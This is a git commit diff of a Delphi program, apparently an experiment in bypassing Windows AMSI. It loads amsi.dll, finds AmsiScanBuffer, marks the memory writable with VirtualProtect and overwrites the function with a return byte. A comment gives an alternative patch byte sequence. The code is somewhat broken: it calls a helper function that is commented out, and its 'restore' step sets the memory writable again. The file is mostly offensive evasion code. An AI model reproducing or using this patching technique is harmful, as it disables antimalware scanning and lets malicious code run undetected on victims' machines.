92cc45a79476128ee37689c1441cd284824a7cc5
p4yl0ad <p4yl0ad@protonmail.com>
2021-07-25 13:06:10 +0100

    updates

--- Experiments/BasedAmsi_E/BasedAmsi_E.dpr
+++ Experiments/BasedAmsi_E/BasedAmsi_E.dpr
@@ -1,3 +1,26 @@
+{http://docwiki.embarcadero.com/RADStudio/Sydney/en/Libraries_and_Packages_(Delphi)
+https://github.com/rasta-mouse/AmsiScanBufferBypass/blob/main/AmsiBypass.cs
+https://stackoverflow.com/questions/2229699/ok-to-use-virtualprotect-to-change-resource-in-delphi
+https://progamercity.net/delphi/789-snippet-write-bytes-memory.html
+}
+
+//x86-64 ret 0xC3
+//x86-64 patch 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3
+
+//Function WriteIt(pAddress: Pointer; Bytes: Array of Byte): Boolean;
+//var
+//  OldProtect, DummyProtect: DWord;
+//begin
+//  if VirtualProtect(pAddress, SizeOf(Bytes), PAGE_EXECUTE_READWRITE, @OldProtect) then
+//   begin
+//    Move(Bytes, pAddress^, Length(Bytes));
+//    VirtualProtect(pAddress, SizeOf(Bytes), OldProtect, @DummyProtect);
+//    Result := True
+//   end
+//   else
+//    Result := False;
+//end;
+
 program BasedAmsi_E;
 {$APPTYPE CONSOLE}
 
@@ -9,48 +32,39 @@ uses
 var
   amsee,kersee : THandle;
   amsibaseaddr, kernbaseaddr : pointer;
-
-{http://docwiki.embarcadero.com/RADStudio/Sydney/en/Libraries_and_Packages_(Delphi)}
-{https://github.com/rasta-mouse/AmsiScanBufferBypass/blob/main/AmsiBypass.cs}
-//x86-64 ret 0xC3
-//x86-64 patch 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3
+  OldProtect, DummyProtect : DWord;
+  retpatch : Array[0..0] of byte = ($C3);
 
 
 begin
   try
     // Load amsi.dll , find AmsiScanBuffer
     amsee := SafeLoadLibrary('C:\\Windows\\System32\\amsi.dll');
-    if amsee <> 0 then
-    begin
+    if amsee <> 0 then begin
       amsibaseaddr := GetProcAddress(amsee,'AmsiScanBuffer');
       WriteLn(Format('amsi.dll base address: %p',[amsibaseaddr]));
-    end;
-
-    kersee := SafeLoadLibrary('C:\\Windows\\System32\\kernel32.dll');
-    if kersee <> 0 then
-    begin
-      kernbaseaddr := GetProcAddress(kersee,'GetProcAddress');
-      WriteLn(Format('kernel32.dll base address: %p',[kernbaseaddr]));
     end
-
-    else
-    begin
+    else begin
     WriteLn('Failed to load');
-    end
-
-
-    //procedure VirtualProtect
-    finally
-
-      FreeLibrary(amsee);
     end;
-    end.
+
+    //Set region to RWX
+    VirtualProtect(amsibaseaddr, SizeOf(retpatch), PAGE_EXECUTE_READWRITE, @OldProtect);
+
+    //Copy Patch
+    WriteIt(amsibaseaddr,(retpatch));
+
+
+    //Move(Bytes, pAddress^, Length(Bytes));
+
+    //Restore region to RX
+    VirtualProtect(amsibaseaddr, SizeOf(retpatch), PAGE_EXECUTE_READWRITE, @OldProtect);
+
+  finally
+    FreeLibrary(amsee);
+  end;
+end.
 
 
 
-    //WriteLn(IntToHex (DWORD ( GetProcAddress (GetModuleHandle ('amsi.dll'), 'MessageBoxA')), 8));
-  //except
-    //on E: Exception do
-      //Writeln(E.ClassName, ': ', E.Message);
-  //end;
-//end.
+
